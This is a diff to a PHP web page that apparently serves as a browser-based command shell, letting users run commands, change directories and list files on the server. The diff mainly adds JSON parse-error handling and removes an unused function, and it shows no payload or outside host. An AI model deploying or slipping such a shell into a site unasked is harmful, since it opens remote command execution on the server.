@@ -431,18 +431,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             shellBody.scrollTop = shellBody.scrollHeight;
         }
 
-        function appendClickableDir(name, fullPath) {
-            const div = document.createElement('div');
-            div.className = 'output-line clickable';
-            div.textContent = '📁 ' + name + '/';
-            div.title = 'Click to navigate to ' + fullPath;
-            div.addEventListener('click', function() {
-                navigateTo(fullPath);
-            });
-            shellBody.insertBefore(div, fileBrowser.nextSibling);
-            shellBody.scrollTop = shellBody.scrollHeight;
-        }
-
         function clearOutput() {
             const toRemove = [];
             let node = shellBody.firstChild;
@@ -462,16 +450,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: 'action=cd&dir=' + encodeURIComponent(path)
                 })
-                .then(res => res.json())
-                .then(data => {
-                    if (data.success) {
-                        updateCwdDisplay(data.cwd);
-                        appendOutput('Changed to: ' + data.cwd, 'success');
-                        loadDirectoryListing();
-                        setStatus('✓ Directory changed');
-                    } else {
-                        appendOutput('Error: ' + data.data, 'error');
-                        setStatus('✗ ' + data.data, true);
+                .then(res => res.text())
+                .then(text => {
+                    try {
+                        const data = JSON.parse(text);
+                        if (data.success) {
+                            updateCwdDisplay(data.cwd);
+                            appendOutput('Changed to: ' + data.cwd, 'success');
+                            loadDirectoryListing();
+                            setStatus('✓ Directory changed');
+                        } else {
+                            appendOutput('Error: ' + data.data, 'error');
+                            setStatus('✗ ' + data.data, true);
+                        }
+                    } catch (e) {
+                        appendOutput('Parse error: ' + text.substring(0, 100), 'error');
+                        setStatus('✗ Invalid response', true);
                     }
                 })
                 .catch(err => {
@@ -486,26 +480,31 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: 'action=list'
                 })
-                .then(res => res.json())
-                .then(data => {
-                    if (data.success && Array.isArray(data.data)) {
-                        fileBrowser.innerHTML = '';
-                        data.data.forEach(item => {
-                            const div = document.createElement('div');
-                            div.className = 'file-item ' + item.type;
-                            const icon = item.type === 'dir' ? '📁' : '📄';
-                            const size = item.type === 'file' ? ' (' + formatSize(item.size) + ')' : '';
-                            div.textContent = icon + ' ' + item.name + size;
-                            if (item.type === 'dir') {
-                                div.title = 'Click to enter directory';
-                                div.addEventListener('click', function(e) {
-                                    e.stopPropagation();
-                                    navigateTo(item.name);
-                                });
-                            }
-                            fileBrowser.appendChild(div);
-                        });
-                        fileBrowser.style.display = 'block';
+                .then(res => res.text())
+                .then(text => {
+                    try {
+                        const data = JSON.parse(text);
+                        if (data.success && Array.isArray(data.data)) {
+                            fileBrowser.innerHTML = '';
+                            data.data.forEach(item => {
+                                const div = document.createElement('div');
+                                div.className = 'file-item ' + item.type;
+                                const icon = item.type === 'dir' ? '📁' : '📄';
+                                const size = item.type === 'file' ? ' (' + formatSize(item.size) + ')' : '';
+                                div.textContent = icon + ' ' + item.name + size;
+                                if (item.type === 'dir') {
+                                    div.title = 'Click to enter directory';
+                                    div.addEventListener('click', function(e) {
+                                        e.stopPropagation();
+                                        navigateTo(item.name);
+                                    });
+                                }
+                                fileBrowser.appendChild(div);
+                            });
+                            fileBrowser.style.display = 'block';
+                        }
+                    } catch (e) {
+                        console.error('Failed to parse listing:', text.substring(0, 100));
                     }
                 })
                 .catch(err => {
@@ -531,22 +530,28 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: 'action=exec&cmd=' + encodeURIComponent(cmd)
                 })
-                .then(res => res.json())
-                .then(data => {
-                    if (data.success) {
-                        const lines = data.data.split('\n');
-                        lines.forEach(line => {
-                            if (line.trim()) {
-                                appendOutput(line);
+                .then(res => res.text())
+                .then(text => {
+                    try {
+                        const data = JSON.parse(text);
+                        if (data.success) {
+                            const lines = data.data.split('\n');
+                            lines.forEach(line => {
+                                if (line.trim()) {
+                                    appendOutput(line);
+                                }
+                            });
+                            if (data.cwd && data.cwd !== currentCwd) {
+                                updateCwdDisplay(data.cwd);
                             }
-                        });
-                        if (data.cwd && data.cwd !== currentCwd) {
-                            updateCwdDisplay(data.cwd);
+                            setStatus('✓ Done');
+                        } else {
+                            appendOutput('Error: ' + data.data, 'error');
+                            setStatus('✗ ' + data.data, true);
                         }
-                        setStatus('✓ Done');
-                    } else {
-                        appendOutput('Error: ' + data.data, 'error');
-                        setStatus('✗ ' + data.data, true);
+                    } catch (e) {
+                        appendOutput('Parse error: ' + text.substring(0, 100), 'error');
+                        setStatus('✗ Invalid response', true);
                     }
                     cmdInput.disabled = false;
                     cmdInput.focus();
@@ -566,16 +571,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                     body: 'action=init'
                 })
-                .then(res => res.json())
-                .then(data => {
-                    if (data.success) {
-                        updateCwdDisplay(data.data);
-                        const cwdLine = document.getElementById('initialCwd');
-                        cwdLine.textContent = 'Current directory: ' + data.data;
-                        cwdLine.className = 'output-line info';
-                        loadDirectoryListing();
-                        setStatus('● Ready');
-                        cmdInput.focus();
+                .then(res => res.text())
+                .then(text => {
+                    try {
+                        const data = JSON.parse(text);
+                        if (data.success) {
+                            updateCwdDisplay(data.data);
+                            const cwdLine = document.getElementById('initialCwd');
+                            cwdLine.textContent = 'Current directory: ' + data.data;
+                            cwdLine.className = 'output-line info';
+                            loadDirectoryListing();
+                            setStatus('● Ready');
+                            cmdInput.focus();
+                        }
+                    } catch (e) {
+                        appendOutput('Init parse error: ' + text.substring(0, 100), 'error');
+                        setStatus('✗ Init failed', true);
                     }
                 })
                 .catch(err => {
